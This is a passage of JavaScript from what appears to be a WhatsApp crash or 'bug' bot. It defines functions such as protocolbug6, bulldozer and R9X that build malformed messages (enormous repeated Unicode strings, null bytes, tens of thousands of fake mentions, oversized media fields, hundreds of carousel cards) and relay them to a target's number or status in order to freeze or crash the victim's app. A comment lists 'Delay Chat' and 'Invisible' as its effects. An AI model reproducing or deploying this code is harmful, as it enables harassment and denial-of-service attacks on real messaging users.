                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                                },
                                {
                                    name: "payment_info",
                                    buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                                        0x2710
                                    )},\"payment_timestamp\":null,\"share_payment_status\":true}`
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson:
                                        "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                                }
                            ]
                        }
                    }
                ];

                const msg = generateWAMessageFromContent(
                    target,
                    {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                                interactiveMessage: {
                                    body: { text: "ꦾ".repeat(99999) },
                                    footer: { text: "4izxvelzExerc1st." },
                                    header: { hasMediaAttachment: true, imageMessage: img },
                                    carouselMessage: { cards }
                                },
                                contextInfo: {
                                    remoteJid: "30748291653858@lid",
                                    participant: "0@s.whatsapp.net",
                                    mentionedJid: ["0@s.whatsapp.net"],
                                    urlTrackingMap: {
                                        urlTrackingMapElements: [
                                            {
                                                originalUrl: "https://nekopoi.care",
                                                unconsentedUsersUrl: "https://nekopoi.care",
                                                consentedUsersUrl: "https://nekopoi.care",
                                                cardIndex: 1
                                            },
                                            {
                                                originalUrl: "https://nekopoi.care",
                                                unconsentedUsersUrl: "https://nekopoi.care",
                                                consentedUsersUrl: "https://nekopoi.care",
                                                cardIndex: 2
                                            }
                                        ]
                                    },
                                    quotedMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 3,
                                            expiryTimestamp: Date.now() + 1814400000
                                        }
                                    }
                                }
                            }
                        }
                    },
                    {}
                );

                await empire.relayMessage(target, msg.message, { messageId: msg.key.id });
                await new Promise(res => setTimeout(res, 5000));
            }

            const msg2 = {
                extendedTextMessage: {
                    text: "Infinite Here!!¿\n" + "𑇂𑆵𑆴𑆿".repeat(60000),
                    contextInfo: {
                        fromMe: false,
                        stanzaId: target,
                        participant: target,
                        quotedMessage: {
                            conversation: "4izxvelzExec1st" + "𑇂𑆵𑆴𑆿".repeat(900)
                        },
                        disappearingMode: {
                            initiator: "CHANGED_IN_CHAT",
                            trigger: "CHAT_SETTING"
                        }
                    },
                    inviteLinkGroupTypeV2: "DEFAULT"
                }
            };

            await empire.relayMessage(
                target,
                msg2,
                { ephemeralExpiration: 5, timeStamp: Date.now() },
                { messageId: null }
            );

            const msg3 = await generateWAMessageFromContent(
                target,
                {
                    extendedTextMessage: {
                        text: "Infinite Ai¿",
                        matchedText: "https://wa.me/13135550002?s=5",
                        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
                        title: "xFlows Attack" + "𑇂𑆵𑆴𑆿".repeat(15000),
                        previewType: "NONE",
                        jpegThumbnail: null,
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                },
                { ephemeralExpiration: 5, timeStamp: Date.now() }
            );

            await empire.relayMessage(target, msg3.message, { messageId: msg3.key.id });
        }

        async function xatanicinvisv4(jid) {
            const delay = Array.from({ length: 50000 }, (_, r) => ({
                title: "᭡꧈".repeat(95000),
                rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
            }));

            const MSG = {
                viewOnceMessage: {
                    message: {
                        listResponseMessage: {
                            title: "assalamualaikum",
                            listType: 2,
                            buttonText: null,
                            sections: delay,
                            singleSelectReply: { selectedRowId: "🔴" },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 30000 }, () =>
                                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                ),
                                participant: jid,
                                remoteJid: "status@broadcast",
                                forwardingScore: 9741,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "333333333333@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "-"
                                }
                            },
                            description: "*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2t Bothering Me Bro!!*"
                        }
                    }
                },
                contextInfo: {
                    channelMessage: true,
                    statusAttributionType: 2
                }
            };

            const msg = generateWAMessageFromContent(jid, MSG, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: jid },
                                        content: undefined
                                    }
                                ]
                            }
                        ]
                    }
                ]
            });

            // **Cek apakah mention true sebelum menjalankan relayMessage**
            if (jid) {
                await empire.relayMessage(
                    jid,
                    {
                        statusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25
                                }
                            }
                        }
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_jid: "soker tai" },
                                content: undefined
                            }
                        ]
                    }
                );
            }
        }

        //===================================
        async function protoXimg(isTarget, mention) {
            const msg = generateWAMessageFromContent(isTarget, {
                viewOnceMessage: {
                    message: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "🧊 공격 KIM BAYU JIHON",
                            fileSha256: "aA1/vATnQcXlUBaQ1oAyXOC6I6ZRVDSuHaYDMpNcGbU=",
                            fileLength: "999999",
                            height: 999999,
                            width: 999999,
                            mediaKey: "b9k58Kc4h6DdwrOWefVdr/aLwHzoxxSWrFQ8Pk2uCXk=",
                            "fileEncSha256": "odx9UpoytXfE7ze2CgIPrJa0K4cCEN/DxFfjt/wKimM=",
                            directPath: "/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c",
                            mediaKeyTimestamp: "1746342199",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAADzxPj1na/bTkx0+uyOOpRoFho5MYb0pSXqr+8R2axtzHNSTAjbCZx2Voxvu3yxLLOQ0vPKsvCabknsXq602sq3Q41nR1MyeaxQB1wG35A1X0NhUMIAEf/EACMQAAIDAAIBBQEBAQAAAAAAAAECAAMREiEEEyIxQVFCFCP/2gAIAQEAAT8AA0ExQpHZi1fncHj4p3YaJ/mOaJxQf1GCMd2MoH3BmExACx4yipEUct0zimYNgrTT2eoBhzvJ5NCJjza/oGFRvX5ANDShDzEFbYNycSD8CGsjfaIq8l7XDL02sjBOXZHAR90QOiKfvZ4rKbAxjMioNJge1Ty64z1QQezKvJtNpBhIZeQPUuL8/aNBjqdBP5ErHHSZRXlkUCxO83JTU5c62icCLMCwVYxbAJbqowzqZZucpYGCnWlTD8JwT1MckA9j4lNuggqVlHkIjsr/ABsNlfzz6jWB7gFY5LLtfhpMsZUcMNjOnpguvZ+BK34gZmxH/wCjSwsoU/cI5b7eyYq7HKqF4r8SpGbmQPd8iMSM5CXOGXqKCfueEhN30ROD2nXwjTmQJWiEkDZ7QTnDRH3sCsdQcsA4Yf5Innhw+ExlcDdiaehKGNbg5o+xPVxgaxgjX2vy6E52nfaIHt9x/Rk9U/0SJ5LCxuWR26wz/8QAGxEAAgIDAQAAAAAAAAAAAAAAAAEQERIgITD/2gAIAQIBAT8AEikPmjGVFw3NmXh//8QAIhEBAAEDAwQDAAAAAAAAAAAAAQACESEQEjEDMkFRQpGh/9oACAEDAQE/ACnt4lj1Np6mLfGVFmbS1OS5CMyeX6vK8VOg/sY1I4Yq8uhVHqLrSQCWJYjP/9k=",
                            scansSidecar: "kGPbOzyrXkA+tcRTlOjwO2d16WRC5j+U3wM0aULEpvWziWDL4AuVmQ==",
                            scanLengths: [7566, 58200, 24715, 32660],
                            contextInfo: {
                                isSampled: true,
                                mentionedJid: [
                                    "13135550002@s.whatsapp.net",
                                    ...Array.from({ length: 40000 }, () =>
                                        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                    )
                                ]
                            },
                            streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                            thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                            annotations: [
                                {
                                    embeddedContent: {
                                        embeddedMusic: {
                                            musicContentMediaId: "kontol",
                                            songId: "peler",
                                            author: "ᥬ🧊공식 ᥬNOCTURX 잘생긴" + "貍賳貎貏俳貍賳貎".repeat(100),
                                            title: "Yorxputz",
                                            artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                            artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                            artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                            countryBlocklist: true,
                                            isExplicit: true,
                                            artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                        }
                                    },
                                    embeddedAction: null
                                }
                            ]
                        }
                    }
                }
            }, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [isTarget],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                            }
                        ]
                    }
                ]
            });

            if (mention) {
                await empire.relayMessage(isTarget, {
                    groupStatusMentionMessage: {
                        message: { protocolMessage: { key: msg.key, type: 25 } }
                    }
                }, {
                    additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                });
            }
        }

        //=================================
        async function protoXvid(isTarget, mention) {
            const mentionedList = [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 40000 }, () =>
                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
            ];

            const embeddedMusic = {
                musicContentMediaId: "589608164114571",
                songId: "870166291800508",
                author: "🧊 공격 KIM BAYU JIHON" + "ោ៝".repeat(10000),
                title: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟",
                artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
            };

            const videoMessage = {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                fileLength: "999999",
                seconds: 999999,
                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                caption: "🧊 공격 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2*",
                height: 999999,
                width: 999999,
                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1743848703",
                contextInfo: {
                    isSampled: true,
                    mentionedJid: mentionedList
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363420088299543@newsletter",
                    serverMessageId: 1,
                    newsletterName: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟"
                },
                streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
                thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
                thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
                thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
                annotations: [
                    {
                        embeddedContent: {
                            embeddedMusic
                        },
                        embeddedAction: true
                    }
                ]
            };

            const msg = generateWAMessageFromContent(isTarget, {
                viewOnceMessage: {
                    message: { videoMessage }
                }
            }, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [isTarget],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: isTarget }, content: undefined }
                                ]
                            }
                        ]
                    }
                ]
            });

            if (mention) {
                await empire.relayMessage(isTarget, {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                }, {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "true" },
                            content: undefined
                        }
                    ]
                });
            }
        }
        //=================================
        // 𝗕𝗨𝗟𝗗𝗢𝗭𝗘𝗥 𝗦𝗜 𝗣𝗘𝗡𝗬𝗘𝗗𝗢𝗧 𝗞𝗨𝗢𝗧𝗔
        //================================
                

        async function bulldozer(isTarget) {
            let message = {
                viewOnceMessage: {
                    message: {
                        stickerMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                            mimetype: "image/webp",
                            directPath:
                                "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                            fileLength: { low: 1, high: 0, unsigned: true },
                            mediaKeyTimestamp: {
                                low: 1746112211,
                                high: 0,
                                unsigned: false,
                            },
                            firstFrameLength: 19904,
                            firstFrameSidecar: "KN4kQ5pyABRAgA==",
                            isAnimated: true,
                            contextInfo: {
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from(
                                        {
                                            length: 40000,
                                        },
                                        () =>
                                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                    ),
                                ],
                                groupMentions: [],
                                entryPointConversionSource: "non_contact",
                                entryPointConversionApp: "whatsapp",
                                entryPointConversionDelaySeconds: 467593,
                            },
                            stickerSentTs: {
                                low: -1939477883,
                                high: 406,
                                unsigned: false,
                            },
                            isAvatar: false,
                            isAiSticker: false,
                            isLottie: false,
                        },
                    },
                },
            };

            const msg = generateWAMessageFromContent(isTarget, message, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [isTarget],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: isTarget },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        }
        /*
{
  "function": [
    {
      "name": "R9X",
      "brand": "LipLap",
      "multiJid": "Yes",
      "effect": ["Delay Chat", "Invisible"],
      "target": ["private", "group", "channel"],
      "rules": "no share no exposed",
      "author": "@kepomemek",
      "support": "@Zeppeliorg",
      "copas": "yatim dongo piatu ga ada otak" 
    }
  ]
}
*/
async function R9X(reyz, target, mention) {
  var R9X1 = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  };

  var cards = [];
  for (var r = 0; r < 597; r++) {
    cards.push({
      header: {
        imageMessage: R9X1,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    });
  }

  var R9X2 = await generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\0" },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    },
    {}
  );

  await empire.relayMessage(
    target,
    R9X2.message,
    mention
      ? { participant: target }
      : {}
  );
}
// < < calling function > > \\

        async function protocolbug6(target, mention) {
            const quotedMessage = {
                extendedTextMessage: {
                    text: "᭯".repeat(42000),
                    matchedText: "https://" + "ꦾ".repeat(5000) + ".com",
                    canonicalUrl: "https://" + "ꦾ".repeat(5000) + ".com",
                    description: "\u0000".repeat(5000),
                    title: "\u200D".repeat(5000),
                    previewType: "NONE",
                    jpegThumbnail: Buffer.alloc(10000),
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "BoomXSuper",
                            body: "\u0000".repeat(20000),
                            thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                            mediaType: 1,
                           renderLargerThumbnail: false,
                            sourceUrl: "https://" + "𓂀".repeat(3000) + ".xyz"
                        },
                        mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
                    }
                },
                paymentInviteMessage: {
                    currencyCodeIso4217: "USD",
                    amount1000: "999999999",
                    expiryTimestamp: "9999999999",
                    inviteMessage: "Payment Invite" + "💥".repeat(2770),
                    serviceType: 1
                }
            };
            const mentionedList = [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 40000 }, () =>
                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
            ];

            const embeddedMusic = {
                musicContentMediaId: "589608164114571",
                songId: "870166291800508",
                author: "Yamete" + "ោ៝".repeat(10000),
                title: "Hentai",
                artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
            };

            const videoMessage = {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                fileLength: "109951162777600",
                seconds: 999999,
                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                caption: "ꦾ".repeat(12777),
                height: 640,
                width: 640,
                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1743848703",
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "KIMOCHI",
                        body: `${"\u0000".repeat(9117)}`,
                        mediaType: 1,
                       renderLargerThumbnail: false,
                        thumbnailUrl: null,
                        sourceUrl: `https://${"ꦾ".repeat(4000)}.com/`
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: target,
                    },
                    quotedMessage: quotedMessage,
                    isSampled: true,
                    mentionedJid: mentionedList
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363420088299543@newsletter",
                    serverMessageId: 1,
                    newsletterName: `${"ꦾ".repeat(400)}`
                },
                streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
                thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
                thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
                thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
                annotations: [
                    {
                        embeddedContent: {
                            embeddedMusic
                        },
                        embeddedAction: true
                    }
                ]
            };

            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: { videoMessage }
                }
            }, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: target }, content: undefined }
                                ]
                            }
                        ]
                    }
                ]
            });

            if (mention) {
                await empire.relayMessage(target, {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                }, {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "true" },
                            content: undefined
                        }
                    ]
                });
            }
        }
        //===============================
        

        async function protocolbug3(target, mention) {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        videoMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                            mimetype: "video/mp4",
                            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                            fileLength: "999999",
                            seconds: 999999,
                            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                            caption: "\u9999",
                            height: 999999,
                            width: 999999,
                            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                            directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1743742853",
                            contextInfo: {
                                isSampled: true,
                                mentionedJid: [
